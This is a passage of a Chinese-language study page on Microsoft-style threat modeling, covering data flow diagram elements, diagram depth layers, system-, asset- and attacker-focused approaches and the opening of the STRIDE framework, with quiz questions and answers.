是否使用数字签名？</td></tr></tbody></table><h4 id="知识检查-5"><a href="#知识检查-5" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>以下哪一项操作最能描述数据存储？</li></ol><div class='checkbox'><input type="radio" />            <p>A. Web 门户要求用户提供其凭据。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 缓存为用户存储与服务相关的 Cookie。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 第三方 API 向其请求者发送请求的数据。</p>            </div><p>参考答案：<psw>== B ==</psw></p><p>解释：<psw>A. 处理输入和输出的行为是与过程相关的事件。B. 存储数据的行为是与数据存储相关的事件。C. 传输数据的行为是与数据流相关的事件。</psw></p><h3 id="外部实体-无控制元素"><a href="#外部实体-无控制元素" class="headerlink" title="外部实体 - 无控制元素"></a>外部实体 - 无控制元素</h3><p><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></p><p>外部实体元素由正方形表示，<u><strong>外部实体可以是过程、数据存储，甚至是直接控制之外的完整系统</strong></u>。</p><p>示例包括：</p><ul><li>与服务交互的用户</li><li>与第三方身份验证服务紧密集成</li><li>组织内由其他团队创建的服务</li></ul><h4 id="何时使用外部实体元素"><a href="#何时使用外部实体元素" class="headerlink" title="何时使用外部实体元素"></a>何时使用外部实体元素</h4><ul><li>在要表示不能直接修改的内容时</li><li>数据存储和外部实体都可启动数据流，因此请验证这两者中的任意一个是否已就绪</li></ul><h4 id="包含上下文-1"><a href="#包含上下文-1" class="headerlink" title="包含上下文"></a>包含上下文</h4><p>在每个外部实体元素中包含以下上下文：</p><table><thead><tr><th align="left">上下文</th><th align="left">问题</th></tr></thead><tbody><tr><td align="left">源</td><td align="left">实体是内部实体还是外部实体？</td></tr><tr><td align="left">类型</td><td align="left">实体是用户、服务提供商还是 Web 服务？</td></tr><tr><td align="left">身份验证</td><td align="left">此过程是否依赖于 Azure Active Directory 进行身份验证？ 如果不是，此过程依赖于什么进行身份验证？</td></tr><tr><td align="left">授权</td><td align="left">它是否依赖于访问控制列表 (ACL) 进行授权？ 如果不是，此过程依赖于什么进行授权？</td></tr></tbody></table><h4 id="知识检查-6"><a href="#知识检查-6" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>以下哪一项操作最准确地描述了外部实体？</li></ol><div class='checkbox'><input type="radio" />            <p>A. Web 门户要求用户提供其凭据。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 缓存为用户存储与服务相关的 Cookie。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 第三方 API 向其请求者发送请求的数据。</p>            </div><p>参考答案：<psw>== C ==</psw></p><p>解释：<psw>A. 处理输入和输出的行为是与过程相关的事件。B. 存储数据的行为是与数据存储相关的事件。C. 传输数据的行为是与数据流相关的事件。 这 C 答案的解释好像有点问题？应该解释为 第三方 API 向请求者启动了数据流？</psw></p><h3 id="数据流-传输元素中的数据"><a href="#数据流-传输元素中的数据" class="headerlink" title="数据流 - 传输元素中的数据"></a>数据流 - 传输元素中的数据</h3><p><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></p><p>元素之间的数据移动用方向箭头表示，**<u>用于指示数据源和目标之间的通信</u>**。</p><p>示例包括：</p><ul><li>用户提交的用于访问服务的凭据</li><li>过程发出的向数据存储添加项的请求</li></ul><h4 id="何时使用数据流元素"><a href="#何时使用数据流元素" class="headerlink" title="何时使用数据流元素"></a>何时使用数据流元素</h4><ul><li>在每个元素交互之间</li><li>调出正在传输的数据类型，并包括其传输方式</li><li>在大多数情况下，包括对每个请求的响应</li></ul><h4 id="包含上下文-2"><a href="#包含上下文-2" class="headerlink" title="包含上下文"></a>包含上下文</h4><p>包含每个数据流元素的以下上下文：</p><table><thead><tr><th align="left">上下文</th><th align="left">问题</th></tr></thead><tbody><tr><td align="left">描述</td><td align="left">数据流是否传递会话令牌、SQL 字符串或用户凭据？ 如果不是，那么数据流传递哪些内容？</td></tr><tr><td align="left">协议</td><td align="left">流使用 HTTPS 还是 SOAP？ 如果都不是，那么流使用的是什么协议？</td></tr><tr><td align="left">流序列</td><td align="left">系统是否枚举数据流以便更容易遵循流序列？</td></tr><tr><td align="left">类型</td><td align="left">数据流中包含哪些类型的数据？ Cookie？ XML？ SOAP 有效负载？ REST 有效负载？ JSON 有效负载？</td></tr><tr><td align="left">其他控制</td><td align="left">数据流是否启用了伪造保护？ 是否启用了其他安全标志？</td></tr><tr><td align="left">身份验证</td><td align="left">此过程是否依赖于 Azure Active Directory 进行身份验证？ 如果不是，此过程依赖于什么进行身份验证？</td></tr><tr><td align="left">授权</td><td align="left">它是否依赖于访问控制列表 (ACL) 进行授权？ 如果不是，此过程依赖于什么进行授权？</td></tr></tbody></table><h4 id="知识检查-7"><a href="#知识检查-7" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>以下哪一项操作最能描述数据流？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 用户凭据从过程传输到身份验证服务提供商。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 存储会话令牌以供以后使用。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 第三方 API 处理服务分析请求。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 传输数据的行为是与数据流相关的事件。B. 存储数据的行为是与数据存储相关的事件。C. 处理数据的行为是与过程相关的事件。</psw></p><h3 id="信任边界-信任区域更改元素"><a href="#信任边界-信任区域更改元素" class="headerlink" title="信任边界 - 信任区域更改元素"></a>信任边界 - 信任区域更改元素</h3><p>信任边界框</p><p><img src="/img/thread-modeling/trust-boundary-box50.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-box50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-box50"></p><p>信任边界线</p><p><img src="/img/thread-modeling/trust-boundary-line50-7523829.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-line50-7523829.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-line50"></p><p>信任边界用虚线或方框表示，用于<u><strong>描述跨不同信任区域级别的数据流</strong></u>。</p><p>示例包括：</p><ul><li>防火墙</li><li>与第三方服务的连接</li><li>系统的某些部分仅对管理员可用</li></ul><div class="note radiation red"><p>信任区域不断变化的区域最易受到攻击者的攻击，应谨慎设计此类区域。</p></div><p>Microsoft 已预定义了一些供工程师内部使用的信任区域要求。你能清楚地确定要应用哪些边界。对于 Microsoft 的员工，请与安全团队联系以了解详细信息。</p><h4 id="何时使用信任边界元素"><a href="#何时使用信任边界元素" class="headerlink" title="何时使用信任边界元素"></a>何时使用信任边界元素</h4><p>关于信任边界，需要记住以下几个要点：</p><ul><li>包含信任边界以处理跨不同信任区域的数据流</li><li>信任边界线用于表示跨大型环境（例如 Internet）的数据流</li><li>信任边界框表示小型环境，例如沙盒环境和企业网络</li></ul><h4 id="包含上下文-3"><a href="#包含上下文-3" class="headerlink" title="包含上下文"></a>包含上下文</h4><p>在每个信任边界元素中包含以下上下文：</p><table><thead><tr><th align="left">上下文</th><th align="left">问题</th></tr></thead><tbody><tr><td align="left">描述</td><td align="left">公司网络边界？Internet？ Azure 订阅？</td></tr></tbody></table><h4 id="知识检查-8"><a href="#知识检查-8" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>以下哪一项操作最能描述跨信任边界的数据？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 用户发送到托管在 Azure 上的 Web 服务的数据。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 在同一 Azure 订阅下，从 Web 服务发送到 Azure 上的数据存储的数据。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 从数据存储发送到 Azure 上同一租户下的进程的数据。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 将数据从不受信任的区域传输到受信任区域的行为跨越了信任边界。B. 从同一受信任区域内的资源传输数据的行为不会跨越信任边界。C. 从同一受信任区域内的资源传输数据的行为不会跨越信任边界。</psw></p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>数据流关系图是系统的图形表示形式，它应包含每个适用的过程、数据存储、外部实体、数据流和信任边界。</p><p>本模块涵盖了以下内容：</p><ul><li>区分了每个元素的形状和功能</li><li>了解了在创建数据流关系图时元素的正确上下文</li></ul><h2 id="模块3-提供具有适当深度层的上下文"><a href="#模块3-提供具有适当深度层的上下文" class="headerlink" title="模块3 | 提供具有适当深度层的上下文"></a>模块3 | 提供具有适当深度层的上下文</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>工程师利用威胁建模能够以图形方式向他人描述系统。 它创建了一个共同的基础，并实现了更加集中的安全对话。</p><h4 id="深度层的重要性"><a href="#深度层的重要性" class="headerlink" title="深度层的重要性"></a>深度层的重要性</h4><p>根据要构建的系统和所需的上下文，威胁模型可能变得太复杂或级别太高。</p><p>数据流关系图深度层可帮助你了解要包含多少上下文以及何时使用它们。</p><div class="note green"><p>请与同事和安全团队联系，选择适当的深度层。 也可以将此模块用作参考。</p></div><h4 id="学习目标-2"><a href="#学习目标-2" class="headerlink" title="学习目标"></a>学习目标</h4><p>在本模块中，你将能够：</p><ul><li>了解数据流关系图深度层之间的差异</li><li>了解何时使用每个层</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h3 id="数据流关系图深度层"><a href="#数据流关系图深度层" class="headerlink" title="数据流关系图深度层"></a>数据流关系图深度层</h3><p>数据流关系图深度层可帮助你确定要成功进行威胁建模练习应包括多少上下文。 有多个因素可帮助确定要了解的深度。</p><p>每个系统都应该大致了解它们的工作方式。 大多数系统应该具有附加的数据流关系图，这些关系图侧重于需要仔细研究的系统部分。</p><p>示例包括：</p><ul><li>分析高度敏感数据的过程</li><li>第三方身份验证系统</li></ul><p>威胁建模中大致使用了四个深度层：</p><table><thead><tr><th align="left">层</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">对于所有系统都是必需的，并且包含主要系统部分。</td></tr><tr><td align="left">1</td><td align="left">对于大多数系统是必需的，并且包含每个系统部分的其他关系图。</td></tr><tr><td align="left">2</td><td align="left">对于高度敏感的系统是必需的，并且包含系统子部分的其他关系图。</td></tr><tr><td align="left">3</td><td align="left">对于关键级别系统或内核级别系统是必需的，并且包含每个过程的其他关系图。</td></tr></tbody></table><p><img src="/img/thread-modeling/depthlayers.png" class="lazyload" data-srcset="/img/thread-modeling/depthlayers.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="depthlayers"></p><p>我们将在接下来的几个单元中介绍各个深度层。</p><h3 id="第-0-层-系统层"><a href="#第-0-层-系统层" class="headerlink" title="第 0 层 - 系统层"></a>第 0 层 - 系统层</h3><p>数据流关系图的系统层是任何系统的起点，因此必须为所有系统创建系统层。</p><p><u><strong>目标：</strong></u><strong>表示主要的系统部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。</strong></p><p>系统层关系图应容纳在一个页面中。 它还应只包含系统处理的主要过程。 提供尽可能多的上下文，并清楚标记每个元素，以便任何人都能理解它的工作方式。</p><div class="note green"><p>系统层也称为上下文层。</p></div><h4 id="何时使用系统层"><a href="#何时使用系统层" class="headerlink" title="何时使用系统层"></a>何时使用系统层</h4><p>你创建的每个系统都需要系统层。 高级别的上下文可以帮助任何人深入了解系统，从而参与更有意义的讨论。</p><h4 id="深入了解系统部分"><a href="#深入了解系统部分" class="headerlink" title="深入了解系统部分"></a>深入了解系统部分</h4><p>在大多数情况下，系统部分需要进行更深入的研究，因为它们会带来风险。</p><p>示例包括：</p><ul><li><u>任何新系统都会给环境带来未知风险</u></li><li>新的分析程序、协议和文件格式</li><li>新的身份验证和授权机制</li><li>新的机密存储或加密算法</li><li><u>与第三方身份验证系统（例如 Facebook）集成</u></li><li>主要功能所需的提升权限</li><li>所需的未加密信道</li></ul><p>如果是这种情况，请为每个系统部分创建其他数据流关系图。 执行以下步骤：</p><table><thead><tr><th align="left">步骤</th><th align="left">指南</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">使用清晰的描述标签创建一个过程元素，例如“Web 服务名称”。</td></tr><tr><td align="left">2</td><td align="left">创建一个新文件，并完全按照描述标签为其命名。</td></tr><tr><td align="left">3</td><td align="left">仅将数据流关系图侧重于要“放大”的系统部分。</td></tr></tbody></table><p>结果将获得过程层（称为第 1 层）中的一系列数据流关系图。</p><h4 id="知识检查-9"><a href="#知识检查-9" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>第 0 层通常被称为什么？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 上下文层。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 过程层。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 子过程层。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 此层是任何系统的起点。 也称为系统层。B. 此层侧重于每个系统部分。C. 此层侧重于特定系统部分的系统子部分。</psw></p><h3 id="第-1-层-过程层"><a href="#第-1-层-过程层" class="headerlink" title="第 1 层 - 过程层"></a>第 1 层 - 过程层</h3><p>数据流关系图的过程层是第二层且应该用于大多数系统。 此层的数据流关系图包含单独的数据流关系图，这些关系图详细介绍每个系统部分。</p><p><u><strong>目标：</strong></u>表示次要的系统部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。</p><p>与系统层相似，过程层中的数据流关系图应容纳在一个页面中，并包含其各自系统部分的所有过程。</p><div class="note warning"><p>大多数数据流关系图都需要过程级别深度层才能进行正确评估。</p></div><h4 id="何时使用过程层"><a href="#何时使用过程层" class="headerlink" title="何时使用过程层"></a>何时使用过程层</h4><p>对每个系统都使用过程层，<u>尤其是在处理敏感数据时</u>。 具有敏感数据的系统遭受攻击的风险更高。 <u>此级别的上下文可帮助你找出威胁以及更有效地降低或消除风险的方法</u>。</p><h4 id="深入了解系统部分-1"><a href="#深入了解系统部分-1" class="headerlink" title="深入了解系统部分"></a>深入了解系统部分</h4><p>在某些情况下，由于系统部分的敏感性和风险增加，可能需要更精细的上下文。 通过转到此层，可以更好地评估威胁和风险降低策略。 遵循系统层中的相同规则。</p><table><thead><tr><th align="left">步骤</th><th align="left">指南</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">使用清晰的描述标签创建一个过程元素，例如“Web 服务工作进程名称”。</td></tr><tr><td align="left">2</td><td align="left">创建一个新文件，并完全按照描述标签为其命名，命名采用类似路径的结构，例如“Web 服务名称 - Web 服务工作进程名称”。</td></tr><tr><td align="left">3</td><td align="left">仅将数据流关系图侧重于要“放大”的系统子部分。</td></tr></tbody></table><p>结果将获得子过程层（称为第 2 层）中的一系列数据流关系图。</p><div class="note green"><p>类似路径的文件命名结构有助于区分不同的级别</p></div><h4 id="知识检查-10"><a href="#知识检查-10" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>大多数应用程序属于哪一层？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 上下文层。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 过程层。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 子过程层。</p>            </div><p>参考答案：<psw>== B ==</psw></p><p>解释：<psw>A. 此层是任何系统的起点。 也称为系统层。B. 此层侧重于每个系统部分。C. 此层侧重于特定系统部分的系统子部分。</psw></p><h3 id="第-2-层-子过程层"><a href="#第-2-层-子过程层" class="headerlink" title="第 2 层 - 子过程层"></a>第 2 层 - 子过程层</h3><p>数据流关系图子过程是第三层。 <u>每当在创建高度敏感的系统时就应使用该层</u>。 此层的数据流关系图包含单独的数据流关系图，这些关系图分别详细介绍每个系统子部分。</p><p>目标：表示系统子部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。</p><p>与过程层相似，系统子过程层中的数据流关系图应容纳在一个页面中，并包含其各自系统子部分的所有过程。</p><div class="note warning"><p>请与你的团队核对以确认是否需要此深度级别。</p></div><h4 id="何时使用子过程层"><a href="#何时使用子过程层" class="headerlink" title="何时使用子过程层"></a>何时使用子过程层</h4><p>将子过程层用于组织认为比较关键的系统。 系统子部分中的漏洞可能会使整个系统、客户和组织面临重大风险。</p><p>示例包括以下系统：</p><ul><li>在安全环境中使用的系统</li><li>处理敏感数据的系统</li><li>具有高风险评分的系统</li></ul><h4 id="深入了解系统子部分"><a href="#深入了解系统子部分" class="headerlink" title="深入了解系统子部分"></a>深入了解系统子部分</h4><p>任何需要更深入研究的系统子部分都应遵循过程层中的相同规则，并具有各自独立的数据流关系图。 通过较低级别的视图，用户可以“放大”和“缩小”系统，以展现尽可能多的上下文并达到更佳的清晰度。 方法如下：</p><table><thead><tr><th align="left">步骤</th><th align="left">指南</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">使用清晰的描述标签创建一个过程元素，例如“输入分析程序名称”。</td></tr><tr><td align="left">2</td><td align="left">创建一个新文件，并使用与描述标签完全相同的名称为其命名，命名采用树状结构，例如“Web 服务名称 - Web 服务工作进程名称 - 输入分析程序名称”。</td></tr><tr><td align="left">3</td><td align="left">仅将数据流关系图侧重于要“放大”的较低级别的系统子部分。</td></tr></tbody></table><p>结果将得到较低级别层（称为第 3 层）中的一系列数据流关系图。</p><div class="note green"><p>类似路径的文件命名结构有助于区分不同的级别。</p></div><h3 id="第-3-层-较低级别层"><a href="#第-3-层-较低级别层" class="headerlink" title="第 3 层 - 较低级别层"></a>第 3 层 - 较低级别层</h3><p>低级别层是最后一层，应在<u>创建内核级别系统或关键级别系统时使用</u>。 此层的数据流关系图包含单独的数据流关系图，这些关系图详细介绍每个低级别系统子部分。</p><p>目标：表示低级别系统子部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。</p><p>与过程层相似，系统子过程层中的数据流关系图应容纳在一个页面中，并包含其各自系统子部分的所有过程。</p><div class="note warning"><p>请与你的团队核对以确认是否需要此深度级别。</p></div><h4 id="何时使用低级别层"><a href="#何时使用低级别层" class="headerlink" title="何时使用低级别层"></a>何时使用低级别层</h4><p>高度关键级别系统和内核级别的系统应在此层进行威胁建模。 数据流关系图应详细描述每个子过程。 此外，通常只为一个子过程进行多轮安全检查。</p><p>按照前面各层中的步骤操作，将每个关系图追溯到各自的系统部分。</p><h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><h4 id="摘要-1"><a href="#摘要-1" class="headerlink" title="摘要"></a>摘要</h4><p>工程师利用威胁建模能够以图形方式向他人描述系统。 它创建了一个共同的基础，并实现了更加集中的安全对话。</p><p>但是，根据要构建的系统和所需的上下文，威胁模型可能变得太复杂或级别太高。</p><p>在本模块中，你了解了如何确定问题的优先级，以及如何根据类型和功能应用恰当的安全控制层。</p><p>本模块涵盖了以下内容：</p><ul><li>了解了数据流关系图深度层之间的差异</li><li>了解了何时使用每个层</li></ul><div class="note info"><p><strong>你知道吗？</strong> 除了这四个层之外，你还可以根据用户角色创建关系图，以帮助找出身份验证和授权方面的缺陷。 据 <a href="https://owasp.org/www-project-top-ten/">OWASP</a> 等信息源的报道，这些事故是目前各个组织面临的最大安全问题，因此，根据适用的角色应用威胁模型可以增强整个系统的安全性并帮助保护客户。</p></div><h4 id="知识检查-11"><a href="#知识检查-11" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>以下哪条陈述概括了在威胁建模阶段提早定义上下文深度层的重要性</li></ol><div class='checkbox'><input type="radio" />            <p>A. 这样我可以收集所有使用的外部组件的详细信息。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 这样做可以帮助我根据要求和期望生成恰当级别的上下文。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 这样做有助于在进行安全评审之前找出所有相关威胁。</p>            </div><p>参考答案：<psw>== B ==</psw></p><p>解释：<psw>A. 该陈述描述了设计阶段的一部分，但未定义上下文深度层的重要性。B. 此陈述阐明了在创建数据流关系图之前设置适当上下文级别的重要性。C. 此陈述描述了中断阶段的一部分，该阶段发生在创建数据流之后。</psw></p><h2 id="模块4-处理数据流关系图关注适当的威胁模型"><a href="#模块4-处理数据流关系图关注适当的威胁模型" class="headerlink" title="模块4 | 处理数据流关系图关注适当的威胁模型"></a>模块4 | 处理数据流关系图关注适当的威胁模型</h2><p>威胁建模是一种有效的技术，可帮助你确定威胁以及找到降低风险的方法。 你可以选择重点关注发现需要保护的方面或者攻击者在系统中的行为方式。</p><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><h4 id="重点关注重要方面"><a href="#重点关注重要方面" class="headerlink" title="重点关注重要方面"></a>重点关注重要方面</h4><p>关注适当的方面可以帮助你定制威胁建模练习，以得出优秀的效果。</p><p>示例包括：</p><ul><li>设计文件共享应用程序，并专注于保护其进程、数据存储和数据流。</li><li>设计文件共享应用程序，并专注于深入了解攻击者。<ul><li>包括攻击者的动机以及可能用于攻击应用程序的方式</li></ul></li></ul><p>在此模块中，<u>你将了解执行针对系统的威胁建模练习的含义</u>。 还会了解针对系统、资产和攻击者的方法之间的大概差异。</p><h4 id="学习目标-3"><a href="#学习目标-3" class="headerlink" title="学习目标"></a>学习目标</h4><p>在本模块中，你将能够：</p><ul><li>定义针对系统的威胁建模练习</li><li>说明针对系统、资产和攻击者的方法之间的大概差异</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h3 id="威胁建模针对性方法"><a href="#威胁建模针对性方法" class="headerlink" title="威胁建模针对性方法"></a>威胁建模针对性方法</h3><p>威胁建模是一种很好的技术，可帮助你在开发生命周期的更早阶段发现问题。 选择侧重点恰当的方法有助于定制威胁建模练习。 你可以发现更多可对其执行操作的威胁和解决威胁的方法。</p><h4 id="侧重系统的方法"><a href="#侧重系统的方法" class="headerlink" title="侧重系统的方法"></a>侧重系统的方法</h4><p>目的是保护整个系统。 关注每个过程、数据存储、数据流、外部实体和信任边界。 利用此信息，可用选择安全控制措施来帮助保护系统。</p><p>此框架有助于分析系统及其对其他资产的影响，具体包括：</p><table><thead><tr><th align="left">资产类型</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">逻辑</td><td align="left">源代码、API 和逻辑安全控制措施</td></tr><tr><td align="left">物理</td><td align="left">服务器和物理安全控制资产</td></tr></tbody></table><h4 id="侧重攻击者的方法"><a href="#侧重攻击者的方法" class="headerlink" title="侧重攻击者的方法"></a>侧重攻击者的方法</h4><p>你可以着眼于攻击者、其动机、方法，以及他们能够在系统中造成破坏的所有方式。 这种方法关注入口点，而不是整个系统。</p><p>使用此方法，你可以专注于包含系统高度机密数据的关键资产。 重点是保护这些资产，而不是整个系统。</p><h4 id="侧重资产的方法"><a href="#侧重资产的方法" class="headerlink" title="侧重资产的方法"></a>侧重资产的方法</h4><p>评估每项资产的风险。 此方法基于分类数据处理等功能确定关键资产，主要专注于保护这些资产。</p><div class="note info"><p>Microsoft 工程师致力于保护系统。 渗透测试团队致力于保护系统和了解攻击者。</p></div><h3 id="针对系统的和其他方面的方法"><a href="#针对系统的和其他方面的方法" class="headerlink" title="针对系统的和其他方面的方法"></a>针对系统的和其他方面的方法</h3><h4 id="侧重系统的方法的重要性"><a href="#侧重系统的方法的重要性" class="headerlink" title="侧重系统的方法的重要性"></a>侧重系统的方法的重要性</h4><p>使用 Azure 对用户进行身份验证是很好的做法。 了解它的工作原理，了解它是如何与系统的每个部分进行交互，可以更好地避免产生实现部署后的未知风险。</p><p>毕竟，威胁建模的目标是验证之前做出的假设，确定潜在的威胁，并在开发生命周期中更早地降低风险。</p><p>侧重系统的方法的实践示例</p><p>让我们以文件共享应用程序为例。 在这种情况下，查看数据流关系图时，可能会看到以下流：</p><ul><li>用户请求访问应用程序</li><li>身份验证流启动</li><li>用户与其他用户共享文件</li></ul><p>此方法分析并保护每个元素， 例如用户、Web 服务、身份验证服务、数据存储、Internet 与 Azure 之间的信任边界以及数据流。</p><div class="note info"><p>针对系统的方法包含其他一些方法，但可能需要一一试用才能获得更精细的效果。</p></div><h4 id="知识检查-12"><a href="#知识检查-12" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>针对系统的方法有什么好处？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 使用此方法，你可以一次专注一个关键资产，以帮助确定所有潜在威胁以及降低或消除风险的方法。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 此方法可提供潜在攻击者的信息，其中包括其手段、动机和行动计划。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 此方法可让你专注于改进系统处理用户和数据的方法。 它还会验证关于通过服务使用的物理和逻辑资产的安全假设。</p>            </div><ol start="2"><li>针对攻击者的方法有什么好处？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 使用此方法，你可以一次专注一个关键资产，以识别所有潜在威胁以及降低风险的方法。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 此方法可提供潜在攻击者的信息，其中包括其手段、动机和行动计划。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 此方法可让你专注于改进系统处理用户和数据的方法。 它还会验证关于通过服务使用的物理和逻辑资产的安全假设。</p>            </div><p>参考答案：</p><ol><li><psw>== C ==</psw></li><li><psw>== B ==</psw></li></ol><p>解释：</p><ol><li><psw>A. 此条目对应于针对资产的方法。B. 此条目对应于针对攻击者的方法。C. 针对系统的方法考察整个系统，而不仅仅是其中的某些部分。</psw></li><li><psw>A. 此条目对应于针对资产的方法。B. 针对攻击者的方法基于攻击者及其攻击计划。C. 此条目描述针对系统的方法。</psw></li></ol><h3 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h3><p>威胁建模是一种有效的技术，可帮助你确定威胁以及降低或消除风险的方法。 你可以侧重于发现需要保护的方面或者攻击者在系统中的行为方式。</p><p>你了解了执行针对系统的威胁建模练习的含义。 还了解了针对系统、资产和攻击者的方法之间的差异。</p><p>在本模块中，你已经学习了以下内容：</p><ul><li>定义了针对系统的威胁建模练习</li><li>说明了针对系统、资产和攻击者的方法之间的大概差异</li></ul><h2 id="模块5-使用框架识别威胁并找到减少或消除风险的方法"><a href="#模块5-使用框架识别威胁并找到减少或消除风险的方法" class="headerlink" title="模块5 | 使用框架识别威胁并找到减少或消除风险的方法"></a>模块5 | 使用框架识别威胁并找到减少或消除风险的方法</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>威胁建模框架可帮助你生成潜在威胁的列表，并找到降低或消除风险的方法。</p><p>你只需具备信息安全方面的应用知识，框架就可为你列出威胁的主要类别，以确保它们得到适当的处理。</p><h4 id="何时使用框架"><a href="#何时使用框架" class="headerlink" title="何时使用框架"></a>何时使用框架</h4><p>此框架应适用于为新系统或现有系统创建的每个数据流关系图。</p><div class="note info"><p>目的是在开发生命周期的早期尽可能多地发现并修复问题。 等待时间越长，客户的风险就越高。</p></div><h4 id="预期结果"><a href="#预期结果" class="headerlink" title="预期结果"></a>预期结果</h4><p>框架将为你呈现六个主要威胁类别，每个类别下有无数个潜在威胁。</p><p>通过该框架，你将能够回答以下问题：</p><ul><li>通信的双方是否都通过了身份验证？</li><li>如何得知某人无法更改传输中的数据、正在使用的数据或静态数据？</li><li>每个操作是否可以绑定到标识？</li><li>如何得知某人无法看到传输中的数据、正在使用的数据或静态数据？</li><li>系统中是否存在资源受限的区域？</li><li>如何得知某人可以执行此操作？</li></ul><p>在本模块中，你将了解每种威胁类别及其相应的安全控制。</p><h4 id="学习目标-4"><a href="#学习目标-4" class="headerlink" title="学习目标"></a>学习目标</h4><p>在本模块中，你将能够：</p><ul><li>讨论威胁建模框架中的每个威胁类别</li><li>了解有助于降低或消除风险的安全控制</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h3 id="威胁建模框架"><a href="#威胁建模框架" class="headerlink" title="威胁建模框架"></a>威胁建模框架</h3><p>威胁建模框架查看数据流关系图中的每个元素（包括它们的交互）。 这有助于发现潜在威胁和找到降低或消除风险的方式。</p><h4 id="威胁类别"><a href="#威胁类别" class="headerlink" title="威胁类别"></a>威胁类别</h4><p>Microsoft 工程师使用 STRIDE 